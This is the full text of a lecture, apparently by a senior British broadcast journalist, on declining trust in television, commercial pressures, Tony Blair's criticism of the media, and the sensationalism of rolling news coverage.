My worry is really about the bigger picture .
And I have to say that it seems to me things have n’t been much helped by they way they ’ve been handled .
We ’ve had the preposterous spectacle of some of the most senior figures in broadcasting running around like maiden aunts who ’ve walked in on some teenage party , affecting shock and disbelief at what they ’ve heard .
It simply wo n’t wash for senior figures in the industry to blame our troubles on an influx of untrained young people : the ITV Alzheimer ’s documentary and the trailer for the series about the Queen were made by a couple of the most venerable figures in the business .
The question we have to ask ourselves is , is there something rotten in the state of television , some systemic sickness , that renders it inherently dishonest ?
But the question behind that one is simply , What Is Television For ?
To take the first question first : is television inherently dishonest ?
Of course it ’s not .
The question is like asking do cars kill people ?
It rather depends who ’s driving .
Right now the impression is being given that the only thing real on television is the cellulite on How to Look Good Naked .
We should start with some acknowledgements , the first of which is that all television is artifice to some degree .
Let ’s not pretend it is n’t .
Even the news : when we see a reporter in waders broadcasting live from a flooded street , do we honestly think the whole town is underwater , and with it the OB truck ?
Every time you stick a noddy into an interview , that ’s artifice .
Even the live television interview itself is artifice .
The key thing is that the audience have to be able to have confidence in us to show them something which , while being manufactured , is a fair representation of the true state of affairs .
That does not demand that things are n’t edited – or even that interviewees are not challenged or helped to express their views clearly .
It demands that we can be trusted to handle the resulting material honestly .
Lose that , allow the impression to get out that we ca n’t be trusted , and we ’re throwing away the one commodity which makes our work worthwhile .
Now , apart from a brief and undistinguished stint on Radio Brighton and a less than stellar period as a newsroom sub , I have spent all my working life in television .
I went into it because it was exciting , because it was as creative as I could manage once I realised I did n’t have the talent to write novels , because I conned myself that I was n’t really starting work .
And , in particular , because I got turned down for every other job I applied for .
I have never regretted it , for a number of reasons .
Because I work with clever , talented and funny people .
Because it never really seems like work .
And , most of all , because I think this medium matters .
My point is this : if we allow the belief to take hold that the medium as a whole is guilty as charged , for it to be reduced to the abject , commercial amorality of much of the worldwide media , British television wo n’t be worth working in .
We should all get out and do something more worthwhile , like selling timeshares or dumping toxic waste on poor countries in Africa .
If we ’re going to stay here , we have to rediscover the purpose of this medium .
I once asked Tim Gardam , when he was editor of Newsnight – before he went on to run Channel Four – what people like us did before television was invented .
“ Oh that ’s easy , ” he said , “ we went into the church . ”
There ’s something in this .
In the old days the Church offered young people who were n’t going to inherit the family estate or go into the army the chance of a comfortable , if not particularly well - paid , occupation which did n’t oblige them to get their hands dirty and gave them an ‘ access all areas ’ pass through the land .
Much the same awaits television producers and researchers now .
We could go on : the skulduggery inside contemporary media organisations is every bit as pervasive as anything in Trollope .
And there ’s the uncomfortable sense that for some people events have no meaning unless they are somehow sanctified by the presence of television : how else are we to explain those people queueing for a DNA test to establish whether their sister may be their mother - in - law on confessionals like the Jeremy Kyle Show ?
But the broader comparison is the way that the media have come to occupy a very similar role to that once performed by nineteenth century clergy .
Edmund Burke is supposed to have coined the expression ‘ the Fourth Estate ’ when he talked of the three Estates in parliament ; the aristocracy , the Church and the commoners , and then pointed out that the reporters in the Gallery had more power than all of them .
This was an absurd exaggeration then but it is much less of one now .
In twenty - first century political life the aristocracy counts for nothing , and the church not for much .
In effect there are two estates that count , the popularly elected and the self - appointed .
When I was asked to give this lecture – and I realised I could n’t wriggle out of it , as I ’d wriggled out of it before , ( PETER BARRON )
I thought I knew what I wanted to talk about .
It was about the relationship between those two estates , the media and political life .
Broadcasting has utterly changed the way that politics is conducted in Britain .
And then , a few weeks later , Tony Blair nicked my subject , in a speech at the Reuters Institute in Oxford in which he talked about us being a pack of feral beasts .
His analysis is the most sustained , high - profile critique of what we ’re about , and I ’m going to deal with what he had to say – and what ’s become of television news - later .
Blair ’s focus was on news , but what he identified as the cause of the trouble applies right across television .
In a nutshell , he defined the source of the problem as hugely increased competition , which makes impact by far the most important consideration in broadcasting , because impact gives competitive edge .
But no sooner had he made his speech than the series of scandals I mentioned earlier began going off , like a series of Bonfire Night fireworks .
It does n’t take a genius to recognise that what links all the scandals – what is the defining problem of contemporary television – is trust : can you believe what you see on television , does television treat people fairly , is it healthy for society ?
There ’s a real danger now either that we lose trust .
Or that in attempting to regain it we retreat into such a mind - numbing literalism that we neutralise the imaginative capacity of the medium .
I heard the other day of a production company which is sending its producers and researchers on a re-education course in which they ’re instructed that if an interviewee does not say on camera what they have said in research , they may not be reminded or encouraged to repeat what they said previously .
It would , they were told , be construed as coaching witnesses .
This is ludicrous .
And I am not entirely convinced by the spectacle of senior figures in this industry walking around like some order of medieval self - flagellating monks offering pre-emptive cringes to all and sundry .
What we need instead is a clear , unambiguous statement of ambition .
Before we can do that we need to recognise is how the world in which we operate has changed .
Firstly , I would modify what Tony Blair said about competition .
As everyone knows , in the last quarter century we ’ve gone from three television channels to hundreds .
Goody , goody , lots of jobs .
Lots more sponsors for tables at those self - regarding awards ceremonies .
I ’m afraid , though , that it comes at a price .
The truth is this : the more television there is , the less any of it matters .
Once upon a time people used to console each other after some gargantuan on - air shambles with the words ‘ ah well , it ’s only television ’ .
It was supposed to give some sense of consolation – at least no - one was dead .
But it was n’t really meant .
Nowadays you could say it and mean it .
This is the key characteristic of the current climate : there is a vast amount of stuff out there .
Ubiquity is the mother of indifference .
And as we all also know , in the digital age , that problem is going to get worse .
We have already entered a world in which , though sites like Youtube , anyone can publish anything .
It ’s removed the magic from production .
The more familiar people become with the medium – like the boy in the jam factory who did n’t eat the stuff because he knew what went into it – the more sceptical they ’re likely to be .
As far as the big broadcasters are concerned , the sad truth is that , apart from soap - operas , there is now hardly a programme with which a broad audience has a regular date .
Dr
Who is a glorious exception , as is the cleverly produced new series of the X factor .
But the reason beleaguered bosses at the BBC , for example , keep trotting out the example of Planet Earth as a reason for the organisation ’s existence is precisely that it is so rare .
Secondly , once the audience is able to watch television at a time , and in a style of its own choosing , the authority of the broadcaster is immediately undermined .
Things like the iPlayer , just as much as the file - sharing websites mean it is no longer some scheduler telling people when something is available , it is the viewer deciding what they want to watch when they want to watch it .
It is a subtle but significant change in the balance of power .
Thirdly , the decline of almost all audiences means that no one programme , or organisation any longer has the natural authority of dominance .
( And a company ’s ability to produce a soap - opera which does well in the ratings does not enhance the authority of its current affairs programmes . )
Fourthly , television is now encountering something which politicians have had to live with for years .
The weather has changed .
We no longer live in a time when trust was axiomatic .
The crisis of confidence in television reflects the crisis of trust in politics : the old ‘ we know best ’ culture – in which producers affected a patrician concern to enlighten the poor dumb creatures who were their viewers wo n’t wash any longer .
But the most important change , it seems to me , is the philosophy which underpins what we do .
Take one case .
The biggest brouhaha of the summer was the fuss over the misleading editing of the trailer for RDF ’s documentary for the BBC about the Queen .
Let ’s be realistic .
Ten years or so ago the BBC would n’t have dreamed of farming out a documentary about a year in the life of the Queen to an independent best - known for such seminal works as Wife Swap .
There ’d have been a producer like Eddie Mirzoeff , a cameraman like Philip Bonham - Carter , and an immensely ponderous production process .
The thing would have lumbered on through endless meetings with royal liaison people , aspired to a secret screening with a lady in waiting or two , and been generally badly up itself .
But it was a clear , controllable operation .
Instead of which , what happens ?
An independent negotiates access to Buckingham Palace and then sells the project to the BBC .
The BBC insists upon another company exec producing the series , the thing is filmed by a young one - man band , RDF contract a more experienced producer to put together his mountain of rushes , the BBC changes it mind about how many programmes it wants , and then the production company re-edits a bit of tape for showing at a festival , to drum up foreign sales to make a turn on the whole project .
You begin to see how things could have gone wrong .
I am , emphatically , not saying there was some Golden Age , because that ’s pointless .
After all , there are some people here old enough to remember the television of that time .
Like the White Heather Club .
But there was something qualitatively different about much of the medium .
The useful thing about the example of the Queen is the way it demonstrates the changing imperatives , the variety of operators , the confused lines of accountability , the fact that money intrudes at every stage .
Now this is new .
For most of the media , most of the time , the motivation has always been pretty simple : you grab as much of the potential audience as possible , in order that you can screw the maximum amount of money out of them .
Television was different because those who made it had a different sense of intention .
In those more innocent days – and it applied to both the BBC and the commercial sector , producers made programmes because they were passionately engaged with the world and wanted to communicate what they ’d found out .
Too much of the time now they simply pick things from the world which look as if they might make good television , regardless of whether they do anything other than meet the demands of a format .
To put it simply , people at the top are less concerned with content and a lot more concerned with bottom lines .
There are too many people in this industry whose answer to the question what is television for ?
is to say ‘ to make money . ’
There is nothing intrinsically wrong with the restructuring of the industry which the Tories began and Labour has continued .
The BBC was big and lumbering and arrogant , and plenty of the independents are lean , and quick and creative .
But the dynamic shifted .
Those reforms also removed from ITV obligations to produce all sorts of programming which was once deemed to be a public good .
Instead of great regional companies with distinguished records – Granada Television being a case in point – we have one amorphous mass .
Tonight with Trevor Macdonald is most definitely not World in Action .
Then came the retreat from children ’s programming .
One by one the public service requirements are being abandoned .
Given the chance , who seriously doubts that ITV would abandon much of its regional broadcasting ?
I ’m not really blaming ITV : once you treat television as if it ’s no different to running a fast - food empire , of course commercial judgements rule .
But who has confidence that news and current affairs will survive even on Channel 4 in the digital age without a regulator ’s enforcement ?
And the only way to stiffen the regulator ’s backbone is to ask them to define what , precisely , is television for .
The difficulty is that I see precious little evidence that anyone is grappling with this question .
In fact , I do n’t see much evidence anyone knows which way is up .
Or to put it another way , it ’s not that the television industry does n’t have a compass .
It ’s that too often it does n’t even seem sure any longer that North exists .
There has been a catastrophic , collective loss of nerve .
To go back to the comparison with the Church , too often the medium seems like the Vatican in one of those periods of medieval complacency .
The cardinals of our trade are more interested in selling indulgences and keeping the estate intact than they are in articulating qualitative judgements about what ’s good , what ’s bad , which programmes matter , and which do n’t .
Instead we have television executives behaving like politicians .
One of New Labour ’s tricks was to commission polling evidence and focus groups to find out what people wanted .
And then to offer it to them .
Television has gone much the same way .
Too often it seems that the people at the top of this industry no longer ask themselves what they ought to be using this uniquely powerful medium for .
Instead of seeking to enlighten the audience , they set out to second - guess them .
It wo n’t be long before we discover what politicians have discovered : if you spend your time telling people what you think they want to hear , pretty soon you lose their respect .
Television and politics are facing the same challenge : how do you connect ?
Which brings me to the question of news .
News is the most important element in the overall ecology of television .
It is the canary in the miner ’s cage .
If and when – and I sincerely hope it ’s never – people begin to trust television news as much as they trust many of the newspapers , then we ’re in trouble .
But I thought the way we responded to Tony Blair ’s speech was pretty pathetic .
Again , let ’s be frank .
These two trades , politics and media have a great deal in common .
Both deal in words and images , both involve a contract with the public based upon fairly explicit promises .
And both are trades best practised by people who are n’t over - encumbered with a sense of their own frailty .
We are also , of course , both down there with estate agents and car dealers when it comes to public affection and trust .
Look at the charts : producers do rank just above paedophiles .
Just .
By and large , the response to Blair ’s attack just pressed the F12 key .
Yah booh .
You ’re a politician .
We ’re media yahoos .
Get over it .
Of course , the attack all seemed a bit rich , coming from a government which took the media more seriously – and tried to control it more effectively – than any previous administration .
I remember once being in Number Eleven Downing Street waiting to do an interview with Gordon Brown , and a side door from Number 12 opening .
In previous governments , Number Twelve was where the Chief Whip had his office .
Now , as it swung back I was astonished to see the place had been taken over by what seemed to be a fibre - optic version of a Victorian counting house - a squad of young people sitting at rows of desks , on the phone bending the ears of journalists .
At the top – can he really have been sitting at a higher desk ?
- that ’s certainly how I think I remember it – sat the brooding figure of Alastair Campbell .
The scene showed how thoroughly priorities had changed : where once government used the room to control and discipline its MP ’s in parliament it now used it to try something similar with the media .
If you read Alastair Campbell ’s diaries – which will turn out to be such a gold mine for future ….
psychiatrists – you get the first hand version .
This was an administration so obsessed with its own PR that the man hired to handle it is even drafting the resignation letters of people who quit the government as a matter of principle .
My own theory about why the diaries are only 789 pages long is that he ran out of expletives to use to describe the media .
But the fact he came loathe the trade he had once practised should n’t blind us to the fact the may have a point or two .
In his speech , which managed to avoid the words wanker , prat , shit and the like – obviously not drafted by Alastair - Blair admitted that a vast amount of the work of his government – perhaps too much - had been devoted to handling the media .
He justified it by claiming this was because we in the media pay little attention to what goes in places like parliament because we ’re obsessed by impact .
In a choice between impact and accuracy , he said , impact wins .
Scandal or controversy beats ordinary reporting hands down .
He went on to accuse us of using extravagant language : every problem ’s a crisis , policies do n’t run into difficulty , they end up in tatters .
We see everything in black and white , and have given up separating fact from comment .
“ We are ” – and this a direct quote “ all being dragged down by the way that the media and public life interact . ”
Now we could despatch some of these ideas quite quickly .
We do not need to take seriously complaints about the marginalising of parliament from a Prime Minister who could hardly be bothered to turn up there much of the time .
Nor need we concern ourselves with complaints about trivialisation of cabinet government from a man whose cabinet meetings could last less time than an edition of Ready Steady Cook .
We do not need lectures about cynicism from an administration which employed people who believed that September 11th was a good day to bury bad news .
Most of all , we do not need homilies about destroying people ’s reputations from an administration on whose watch Dr David Kelly was driven to suicide .
But I found the media ’s response – and particularly the response of the television industry - to the Blair challenge pretty depressing .
Hardly anyone engaged with the substance of the criticisms – of our triviality , our short - sightedness , our preoccupation with conflict .
The immediate and almost universal reaction was not to examine the charge sheet , but to utter a blanket plea of ‘ not guilty ’ , usually followed by well , you misled us about WMD , as if that somehow entitles us to say whatever we like .
Well , it wo n’t do .
There was plenty wrong with Tony Blair ’s speech .
To talk about the media being ‘ feral beasts ’ was weird , because , as we all know , feral either means untamed , or it means to run wild , as if they were once tamed .
But surely we ought to be untamed ?
The alternative is to be some sort of poodle .
There ’s a story in Simon Armitage ’s All Points North , a memoir of his life in Yorkshire , where he was probation officer , of a home visit to see the mother of a young offender on a run - down housing estate .
He found the tattered house , with an enormous half - wild Alsatian dog running around the overgrown front garden .
The mother answered the door , the Alsatian pushed past her into the house , and the probation officer and mother sat down to a cup of tea .
Ten minutes into the conversation , the dog took itself off into the corner of the room and relieved itself .
Copiously .
The Probation Officer is first appalled , then decides to use the dog as a way into the question of the delinquent son .
He plucks up the courage to ask the mother : is n’t there anything she could do to control the dog ?
To which the woman replied .
‘ But I thought it was your dog . ’
You can imagine the story , if it were told in Downing Street , becoming some laboured metaphor about the relationship between Probation Officers and offenders being like that between spin doctors and the media .
But to me the hero of the story ’s quite clear .
It ’s the Alsatian .
What was wrong with Blair ’s speech was that instead of attacking the Alsatian he went for the Independent .
This was a pathetic target .
If the problem ’s a feral Alsatian , do n’t kick the neighbour ’s toy poodle instead .
It was also foolish , because if any paper chooses not to be part of the pack , it ’s the Indie .
But to suggest that just because he picked the wrong example the whole complaint is – as Alastair Campbell ( how we miss him ! ) would put it – ‘ bollocks ’ or ‘ crap ’ or something similarly cerebral , wo n’t do .
Something has changed - and changed profoundly - in the way that public life works .
Just look at this progression .
Once radio and television reported speeches in parliament .
Then we asked Cabinet ministers what they would like to say to the nation .
Then we cross -examined them .
Now the BBC political editor comes on after they ’ve appeared , to pass judgement on whether their performance was convincing .
And yes , I do appreciate that people like me are seen by some of Tony Blair ’s cheerleaders as part of the ruination of this relationship .
I want to say three things about that .
One , that I do genuinely believe there ought to be a chasm between journalists and politicians .
I intend no criticism of colleagues in the lobby who ’ve come to a different conclusion .
But that ’s what I think .
( I do not , incidentally – and I am heartily sick of this quote of being attributed to me – think they ’re all lying bastards .
I never said it .
And they ’re not .
Although I do think we should always be very sceptical . )
In fact I fear there ’s a dreary tendency on all our parts whenever a story breaks to address it by asking for an interview with the minister responsible .
I ’ll give you an example .
When we learned a few weeks ago that ‘ tough on crime , tough on the causes of crime ’ meant that thousands of prisoners were going to be released early , it was an opportunity to have a sensible , grown - up discussion about why we lock so many people up in this country , what we do with them while they ’re there , and whether releasing them a few weeks early makes any difference .
That discussion might have involved people who know about penal policy , maybe a prison governor , and perhaps a thoughtful ex –con .
Instead of which what did we end up with on Newsnight ( and elsewhere ) ?
The latest prison minister and his conservative shadow .
Why do we do that ?
Because we ’re too close to Westminster politics , and because when the production desk is being run ragged , looking for guests , the one thing you can be sure about is a politician ’s willingness to spout confidently .
And secondly , on the subject of confrontational interviews , not every interview needs to be like that .
In fact most of them are n’t – just the usual journalistic interrogatives : who , when , where , why , how .
In the small proportion which are more contentious the way to avoid confrontation is pretty simple .
You just answer the question .
But I ’m not going to devote the rest of this lecture to attempting to justify what I do , because I want to engage with a slightly bigger picture .
I ’d like you to imagine a Prime Minister who has more powers than any other in the entire twentieth century : powers to order his citizens to go into battle , to order industries to stop of start production , powers even to seize public property .
He does this with little serious public opposition .
And in his entire period in office he holds not a single news conference .
It is unimaginable .
Yet it is true .
The Prime Minister was Winston Churchill .
The only occasion on which he held a press conference was on December 23rd 1941 .
He was visiting Washington .
Roosevelt belonged to a different political culture .
He persuaded a baffled Churchill to undergo the ordeal .
The transcript in the Roosevelt papers reads as follows :
“ The President .
‘ And so I will introduce the Prime Minister .
I wish you ’d stand up for one minute and let them see you . ’ ”
Churchill then stands on a chair and takes a dozen or so questions from the reptiles , almost all of whom address him as ‘ sir ’ , and not one of whom follows up his original inquiry with any persistence or repetition .
Occasionally , perhaps because he genuinely was going deaf , perhaps to give himself time to think , Churchill says he can’t hear the question , and it is repeated , slowly .
At the end , the Prime Minister is thanked by the press corps .
That one occasion apart – and that was an event into which he ’d been lured by his host – I can find scarcely any evidence that the greatest political leader of the last hundred years ever chose to talk directly to the media .
Odd , really , when you think that he ’d once been happy to put the word ‘ journalist ’ in his passport , and showed that steely mercenariness which is the pre-requisite of any successful freelance : he even tried to sell speeches he ’d made in parliament to an American media organisation .
What an example to us all .
But underneath it all , he regarded us with disdain .
How very different to our own dear leaders today , who will play tennis or head footballs in their business suits , ride bicycles , kiss babies , say that today is not the day for sound - bites , but the hand of history is on their shoulder , and so on and so on .
In those days , the media knew their place .
Even ten years ago in this country , if you were asked about the media , you thought of your own newspaper , or weekly magazine , or favourite television channel .
But if you ask the question nowadays you get an entirely different answer : the media are – is - an entity in its own right , a collective being with its own distinct nervous system .
It eats , it breathes , it excretes .
It has distinct pleasure centres in its brain and it has an awful lot of problems with its eyesight .
Just look at the growth in news .
In the year before Blair took office ( 1995 - 6 ) , the BBC alone broadcast just over five thousand hours of news and current affairs ( 5,270 ) .
Ten years later , the figure had risen to twelve and a half thousand hours ( 12,485 )
In this environment , politics is increasingly played out in the media .
Sometimes it seems that politics is only about the media .
The media are certainly the amniotic fluid in which public life swims .
For ten years we have seen ministers announcing policies on radio and television instead of in parliament , and watched them cross - examined about them on radio and television instead of in parliament .
Gordon Brown says he ’ll change this way of doing things .
Let ’s wait and see .
The basic charge sheet against us from Tony Blair and Alastair Campbell is as follows .
Firstly , that we behave like a herd .
Secondly that we have a trivial and collective judgement .
Thirdly , that we prefer sensation to understanding .
I ’m sorry to say , but I think there ’s something in all of these arguments .
Takes the question of herd – or pack – like behaviour .
This was not a criticism made when the Blair government began , when the herd collectively gave the impression he could do no wrong .
He liked that .
Before that , of course , we had collectively believed that the Major government was the Downing Street outpost of the Keystone Cops .
In time , the worm turned for the Blair regime , too .
Then the Blair government decided pack behaviour was a bad thing .
Alastair Campbell tells me that he came to believe that , ‘ News was only news if it was bad news for the government . ’
So , he claims , the Olympic bid was consistently reported as something that was sure to fail .
Government White Papers were discounted before they published – not surprising when we ’d already been told was going to be in them – and news was the presentation of opinions about them .
Reporting became increasingly more opinion and less analysis , as a consequence of which – another Campbell comment – ‘ there is now more reporting of politics than there has ever been .
And less understanding . ’
The media as whole were smug and self - satisfied and believed they could do no wrong .
The BBC in particular was incapable of ever admitting it makes mistakes .
Well , none of this comes as much of a surprise when you recall the Hutton Inquiry .
But that does n’t mean it ’s not worth examining .
Are we instinctively oppositional ?
With the exception of honeymoons like the start of the Blair years , I think we are .
Does it matter ?
Well , it would obviously be better if we always acted thoughtfully .
But on the whole , I think the interests of democracy are better served than in a system where the media think it part of their duty to help the government get its way .
The big question here is the one of legitimacy .
Sometimes , in the middle of the night , I wonder about what I do .
It comes in the form of a question .
‘ And who , precisely , do you presume to speak for ? ’
Who ever voted for you ?
It ’s something we ’d do well to remember .
The answer to the question of whether people like me have any special right to interrogate the powerful is no : I have just the same right as anyone else .
The only difference between my position and that of any other citizen is not entitlement but opportunity .
I ’ve got the chance .
But the justification is built on an intuitive understanding of what the function of the medium is .
That we ask the questions the average reasonably intelligent member of the public would like to see asked .
And if you ask a question , you owe it to the audience to get an answer .
Even if you have to ask the question more than once .
Or more than a dozen times .
The relationship between the media and politics is , Tony Blair tells us , increasingly fractious .
I ’m not really sure this is something we need to worry too much about : our responsibility is to the citizen .
But we ought also to acknowledge one enormous blind spot .
There is a tacit understanding between the two sides which does no - one any favours .
There are three parties here : the politicians who govern , or want to govern , secondly , the media , and the thirdly , the public .
It is a very odd characteristic of this relationship that while the media and politicians feel free to criticise each other , neither has the guts to criticise the public , who are presumed never to be wrong .
It is not just that Sun readers are always right .
The whole public is always right .
One very small example .
Last April , GMTV tackled the case of a Yorkshire man who needed medical treatment to prevent the loss of an eye .
The treatment was currently unavailable on the NHS .
The man was interviewed down the line , at the end of which one presenter turned to the other and said , ‘ It ’s just wrong , it ’s as simple as that .
Sometimes you just have to say that . ’
At which his co-presenter tutted ‘ He ’s an ex-serviceman too .
He ’s devoted most of his life to public service . ’
The exchange ended ‘ And even if he was n’t , he ’s paid his taxes .
Anyway , coming up after 8 o’clock ….’
Now , in an ideal world , everyone should get whatever treatment they need , regardless of the cost .
So the presenters were only repeating what you could hear in any Starbucks across the land .
What no - one ever says when covering these stories is that rationing is the inevitable consequence of the fact that people wo n’t pay more in taxes .
Let none of us for a moment suggest the British people might be hypocritical or even thoughtless .
No danger of that at GMTV .
No danger , really , of it anywhere .
Would it not be a lot more sophisticated –and honest - to acknowledge sometimes that things may be more complicated than they appear ?
Let ’s not follow the tabloid newspapers on issues like that .
And also , let ’s not believe them when they say we ’re all dishonest .
Overall , I have to say that I think standards of probity on television are pretty high .
I believe most of what I see on television , and when , in the heat of the moment , things turn out to be wrong , I ’m willing to give those responsible the benefit of the doubt : it ’s not easy getting things clear in the early stages of any moving story .
The problem , it seems to me , is less one of honesty than of attention span .
The press of events now dictates that almost every story is best if it ’s a moving story .
In fact , if it ’s not a moving story , it ’s hardly a story at all .
The only radio news story which has made me sit up in bed in the morning this year was the Today programme ’s revelation in March this year that Bob Woolmer had been murdered .
Except , of course , he had n’t .
The next month I was in Egypt , when I switched on BBC World to have reporting of the Nigerian elections interrupted with the words
‘ And we ’re just getting some breaking news .
It ’s from Britain . ’
Oh my god , I thought , that ’s happened .
More bombs ?
Blair assassinated ?
The newsreader continued .
“ Prince William and Kate Middleton have split up . ”
Actually , that is by no means the worst example this year .
In early June a building collapsed in Westminster .
For the best part of an hour , the news channels talked of little else .
Aerial live shots were beamed back .
Reporters are deployed , required to repeat endlessly the same minimal facts to fill the void .
Eyewitnesses are interviewed .
They talk about how when the top of a building collapses , bits of debris fall to the ground .
And then , slowly it emerges that what has happened is what looks to have happened .
Part of a building has collapsed .
Now , although it ’s easy to poke fun at it , I would defend that coverage .
Obviously , the fear in the back of everyone ’s mind is that there ’ll be another successful terrorist attack , and the only way to find out is to be present , reporting .
But the problem is that all news programmes need to make noise .
The need ’s got worse , the more crowded the market ’s become .
We clamour for the viewers ’ attention : “ Do n’t switch over .
Watch us !
You wo n’t be disappointed ! ” ( I confess that making this appeal in the dog days of August is peculiarly dispiriting .
Sometimes you want to sit there and say , ‘ Not much has happened today .
I ’d go to bed if I were you . ’
But , no , the pretence must be maintained that forty - five minutes ’ worth of discussable material exists . )
So , we all shout .
The difficulty is that it is one thing to do this shouting at periodic intervals during the day – at lunchtime , in the early evening , at nine or ten o’clock , or at bedtime .
It ’s quite another to have to do it every fifteen or thirty minutes .
Self respect – and the culture of the medium - demands that we try to make an impact .
You want to write an intro that grabs the viewer .
The problem is that a sort of expectation inflation sets in .
The warnings are out there .
Once it was enough that that great success of the Blair years , Big Brother locked a bunch of people up together and watched what happened .
Now they have to be given things to do which are calculated to embarrass , humiliate or provoke them – the audience ’s jaded palate needs to be constantly titillated .
The danger is that the same thing happens with news : if for no other reason than to save producers and presenters from more of that dead - eyed somnambulism you can already see too often , the story needs to be kept moving .
So it needs to be constantly hyped .
Making a lot of noise is one thing we ’re all pretty good at .
So the pavement - standers in Downing Street or wherever must pretend to omniscience , even though they ’ve spent so long on the end of a live - link that they ’ve had no chance to discover anything much beyond where the nearest loo may be .
In this context , the very slightest development which might give some sense of movement to a story is fallen upon as if it were a press release announcing the Second Coming .
Take , for example , the outbreak of bird flu in Suffolk this spring .
The thing was contained and dealt with effectively .
There was no panic , except in so far as it was generated by television news coverage .
An expensively coiffed presenter is driven up to Suffolk to stand in a field in the vague vicinity .
A helicopter is put up so a reporter can speak of the incident as if it was the scene of a major tank battle .
For me the nadir was an interview with a woman who owned a chicken coop .
The reporter knew what was wanted .
‘ We have a dead chicken over there , ’ the woman wailed .
‘ Whether that chicken was knocked down by a car , we do n’t know . ’
And that was it .
There was a dead chicken in Suffolk .
Cause of death unknown .
What , precisely was this chicken ’s owner interviewed for ?
There are plenty of definitions of news .
But whether you subscribe to the view that it is something out of the ordinary , or – my own favourite – that it is something someone does n’t want you to know - the fact that a chicken has died in Suffolk , possibly after colliding with a car , does n’t cut it .
What ’s happened is that we have a dynamic in news now that is less about uncovering things than it is about covering them .
It does n’t matter whether it ’s a war in Lebanon or floods in Doncaster , it does n’t really exist until there ’s a reporter there in flak jacket or wellingtons , going live .
Television has always been driven by technical feasibility as much as editorial judgement .
When pictorial news came from newsreels , people in Stornoway learned of the battle of the Somme four weeks after the event .
When the Americans were in Vietnam , reporters had to get their film back from the front and then often persuade someone to carry it on a plane to someplace they could get it processed and cut .
Now , you go live , live , live , wherever you can .
It ’s happened because of the pressure to be fresh and urgent , because of the way the market works , and because , well , because it ’s possible .
Of course , we ought also to recognise that 24 hour news itself may just be some intermediate technology , like analogue television , or VHS cassettes , or DVD ’s .
I do n’t think I ’m attacking the principle of 24 hour news .
But I am saying that we all need to redefine what we think of as news .
Sometimes I wonder whether there ’s enough going on in Britain to sustain these channels at the level of portentous immediacy they require .
Of course there ’s enough going on to sustain 72 hour a day news coverage .
God knows , just look at almost any regional news programme , with its tawdry catalogue of misfortune , recited in deadbeat vocabulary .
You ’d think that every child in the city was being sexually abused , every journey every day disrupted , resulting in ‘ pure misery ’ , every teenager a drug - crazed psychopath .
Does it alarm ?
Sure .
Does it help us understand ?
You must be joking .
But in the very crowded world in which television lives , it wo n’t do to whisper , natter , cogitate or muse .
You have to shout .
The need is for constant sensation .
The consequence is that reporting now prizes emotion over much else .
In this press of events there often is n’t the time to get out and find things out : you rely upon second - hand information – quotes from powerful vested interests , assessments from organisations which do the work we do n’t have time for , even , god help us , press releases from public relations agencies .
The consequence is that what follows is n’t analysis .
It ’s simply comment , because analysis takes time , and comment is free .
In news , as much as anywhere else in the industry , the question is no longer ‘ what can we do ? ’
It ’s ‘ what can we afford ? ’
Finding things out takes time and money .
Easier to stay in the warm fug of what everyone agrees is news .
Which is , of course , why we behave as a herd of not -very - clever animals .
It ’s less risky than thinking for ourselves .
So no - one seems to question judgements .
An obvious example is the decision to broadcast the deranged rantings of the young man who shot dead over thirty people at Virginia Tech .
You ’ll recall that before the killings he posted a tape he ’d made of himself to NBC , who , when they got it , pondered the ethics of broadcasting the thing for all of five seconds before plastering it all over the network , on the ludicrous justification that it was as close as we ’ll ever come to understanding the mind of a mass murderer .
And then British broadcasters – including , I ’m ashamed to say Newsnight - did pretty much the same thing .
Or what about Madeleine McCann , the three year old girl who disappeared in Portugal this spring ?
This provoked huge coverage , with reporters on twenty - four - hour - a day stakeouts , presenters flown out to stand on the pavement , attempting to parlay ignorance into authority .
Everyone was there because everyone else was there .
If you dared to ask what this circus was about you got the response “ we ’re there because the family want us to be there .
We ’ll stay as long as they want us to be there . ”
The McCann family are still in Portugal .
The reporters went back and visited them a couple of weeks ago .
Then they came home again .
At times like this , when the television hurricane hits a story , it too often sucks good sense and consideration out of the brains of those involved .
All this does – very effectively – make a lot of noise .
But to what end ?
Of course , you still hear people saying ‘ I do n’t watch the news – it ’s depressing . ’
The answer to this is to invite them to imagine a world in which things which made you happy were so unusual they were newsworthy .
No , much more nowadays , the problem is that news is determined not by its importance but by its availability .
How else can we explain the decision to interrupt reporting of floods in Britain to go live to America breathlessly to cover Paris Hilton ’s release from jail ?
Sorry , who ?
Why ?
What relevance is this to any of us ?
If you ’re not careful , eventually , you get to a point where you just think ‘ what is the point of watching this stuff ? ’
I have been a television journalist for almost all my working life .
And I have to confess to a gnawing anxiety .
Does exposing people to this ceaseless torrent make them any better off ?
I have always believed passionately – and continue to believe – in the public ’s right to know , that a well - informed democracy is a healthy democracy – but you do begin to wonder when this ceaseless tide of predigested stuff comes at you .
I feel uncomfortable saying this , because I know that some colleagues may take it as an attack upon them .
So let me say that I think the young people entering television now are more technically able , more visually creative than at any time in the short history of the medium .
I admire them , not least because I have no idea how they do half the things they do .
My point about the vaccuousness of much news reporting is not to lay into them , but to plead for them to be given the time and the space to do a better job and for all of to stand back and ask what we ’re using this medium for .
We need to recognise a key distinction .
Visibility is not the same as understanding .
Again , we need to ask : what is all this FOR ?
My old friend Peter Weil – the only man to invent a daytime television show and receive letters from the audience demanding the return of the test card – thinks that at this stage what I should just come out and say ‘ John Birt was right . ’
Something like ‘ Tony Blair , Alastair Campbell , John Birt – the three most misunderstood men in recent times . ’
But I ca n’t quite do it .
He ’s recalling the infamous article written by Birt and Peter Jay , which talked about a bias against understanding on television .
It led to some very worthy and immensely dull television programmes , to an invasion of blokes in funny suits at the BBC , followed by enormous structural changes , most of which have been quietly forgotten .
But you could at least say that Birt had a clear idea of what television was about .
I ’m not talking about quite the same thing .
For one thing , I find it too amusing to try to imagine how the pre-scripting of films and the careful pre-selection of congenial witnesses would survive the current hoo - ha about fakery .
My point is that there comes a point where the frenzy has to be put to one side , the rolling story halted , so that we can make sense of things .
Television journalism ’s justification should be the justification of journalism through the ages : to inquire , to explain and to hold to account .
The news may have been dull , but it was respected because it made sense of the day .
That involved people assessing , filtering , separating the froth from what mattered .
It was , in short , the exercise of clear judgement .
And in return , it demanded - and got - the trust of the audience .
Right now we could do with less hyperventilating and more deep breathing .
We ’re back , then , to the question of what television is for .
All the recent scandals and so - called scandals have one element in common : money .
